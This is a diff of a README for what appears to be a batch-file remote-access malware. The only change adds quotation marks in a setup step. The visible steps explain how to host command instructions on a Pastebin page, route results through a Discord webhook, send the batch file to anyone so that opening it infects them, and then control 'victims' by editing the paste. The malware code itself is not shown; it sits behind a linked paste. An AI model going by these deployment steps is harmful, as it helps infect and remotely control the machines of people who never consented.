@@ -45,7 +45,7 @@
 ####  3. Create New Unlisted Paste
 ####  4. Copy and Paste this Code : [Link](https://pastebin.com/TPNfDEu7)
 ####  5. Copy the Url of youre Paste site and change it like this https://pastebin.com/jsdagjj >> https://pastebin.com/raw/jsdagjj now paste this link into the              batch file where it sets the variable Server=LinkHere
-####  6. Create a New Discord Server, Text Channel >> Settings >> Integration >> Create Webhook >> Click on Captain Hook >> Copy WebHook-URL, Paste to variable WebHookURL=WebHookLinkHere
+####  6. Create a New Discord Server, Text Channel >> Settings >> Integration >> Create Webhook >> Click on "Captain Hook" >> Copy WebHook-URL, Paste to variable WebHookURL=WebHookLinkHere
 ####  6. Send this batch File to anyone, the person only have to open the File and they get Infected.
 ####  7. Now Setup is done and you can Control youre Victims via Editing the Paste site and send out Commands!
 ####  0. Need Help? Contact Me : Executioner#5068
